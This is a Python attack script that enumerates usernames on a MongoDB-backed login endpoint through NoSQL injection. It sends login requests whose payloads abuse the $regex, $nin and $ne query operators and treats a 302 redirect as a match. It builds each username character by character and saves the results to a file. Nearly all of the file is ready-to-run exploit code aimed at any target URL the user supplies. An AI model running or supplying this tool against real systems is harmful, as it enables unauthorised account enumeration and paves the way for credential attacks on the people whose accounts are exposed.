#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string, argparse, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def def_handler(sig, frame):
    print("\n\n[!] Exiting ...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def initialize_session(proxy_url, verify_ssl):
    session = requests.Session()
    
    session.headers.update({
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    if proxy_url:
        proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
        session.proxies = proxies
        session.verify = False
        
    elif not verify_ssl:
        session.verify = False
    
    return session

def make_request(session, url, payload):
    try:
        response = session.post(
            url,
            json=payload,
            timeout=300,
            allow_redirects=False
        )
        return response
    except requests.exceptions.RequestException as e:
        log.error(f"Request error: {e}")
        return None

def enumerate_usernames(session, url):
    usernames = []
    current_username = ""
    characters = "".join(sorted(
        set(character for character in string.printable if character.isprintable()), 
        key=string.printable.index
    ))
    
    progress_bar = log.progress("Enumerating users")
    progress_bar.status("Starting brute-force attack")
    
    while True:
        character_found = False
        
        for character in characters:
            if character in '.^$*+?{}[]\\|()':
                character = '\\' + character
            
            payload = {
                'username': {
                    '$regex': f'^{current_username}{character}',
                    '$nin': usernames
                },
                'password': {'$ne': None}
            }
            
            progress_bar.status(payload)
            
            response = make_request(session, url, payload)
            
            if response.status_code == 302:
                current_username += character
                character_found = True
                break
        
        if not character_found:
            if current_username and current_username not in usernames:
                usernames.append(current_username)
                log.success(f"✓ User found: {current_username}")
                current_username = ""
            elif not current_username:
                break
    
    progress_bar.success("Completed")
    return usernames

def save_results(usernames, output_file):
    if usernames:
        try:
            with open(output_file, 'w') as f:
                for username in usernames:
                    f.write(f"{username}\n")
            
            log.info(f"Total users found: {len(usernames)}")
            log.info(f"Users saved to {output_file}")
        except IOError as e:
            log.error(f"Error saving results: {e}")
    else:
        log.failure("No users found")

def main(url, proxy_url=None, verify_ssl=True, output_file="usernames.txt"):
    session = initialize_session(proxy_url, verify_ssl)
    
    usernames = enumerate_usernames(session, url)
    
    save_results(usernames, output_file)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='MongoDB Username Enumeration via NoSQL Injection',
        add_help=False
    )
    parser.add_argument('-h', '--help', action='help', 
                       help='Show this help message and exit')
    
    parser.add_argument('-u', '--url', required=True, metavar='', 
                       help='Target URL (e.g. https://example.com/login)')
    
    parser.add_argument('-p', '--proxy', metavar='', 
                       help='Proxy URL (e.g. http://127.0.0.1:8080)')

    parser.add_argument('-k', '--insecure',
                       action='store_true',
                       help='Disable SSL certificate verification (for self-signed certificates/invalid certificates)')
    
    parser.add_argument('-o', '--output', default='usernames.txt', metavar='', 
                       help='Output file (default: usernames.txt)')
    
    args = parser.parse_args()
    
    main(url=args.url, proxy_url=args.proxy, verify_ssl=not args.insecure, output_file=args.output)
